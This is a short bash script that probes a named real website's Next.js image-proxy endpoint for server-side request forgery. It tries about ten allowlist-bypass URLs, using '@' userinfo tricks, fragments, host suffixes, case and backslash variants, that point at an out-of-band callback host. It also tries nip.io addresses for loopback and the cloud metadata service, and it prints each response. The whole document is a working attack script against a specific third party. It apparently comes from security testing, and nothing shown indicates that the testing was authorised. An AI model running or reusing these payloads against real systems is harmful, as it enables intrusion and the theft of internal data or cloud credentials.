#!/bin/bash
B="https://www.infinitycapital.bh/_next/image"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36"
enc() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }

# allowlist bypass attempts against images.ctfassets.net (the only allowed host)
i=0
for U in \
 "http://images.ctfassets.net@oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/a" \
 "http://oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in#images.ctfassets.net/a" \
 "http://images.ctfassets.net.oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/a" \
 "http://IMAGES.CTFASSETS.NET@oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/a" \
 "http://images.ctfassets.net:80@oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/a" \
 "http://oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/?x=images.ctfassets.net" \
 "http://xn--imgs-cfassets-netc/x" \
 "http://images.ctfassets.net\\@oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/a" \
 "http://127.0.0.1.nip.io/a" \
 "http://169.254.169.254.nip.io/latest/meta-data/" \
 ; do
  i=$((i+1))
  E=$(enc "$U")
  printf "[%02d] %-70s -> " "$i" "${U:0:70}"
  curl -sk -o /tmp/ab.txt -w "code=%{http_code} size=%{size_download}" -A "$UA" "$B?url=${E}&w=640&q=75"
  echo " | $(head -c 60 /tmp/ab.txt | tr -d '\n')"
done
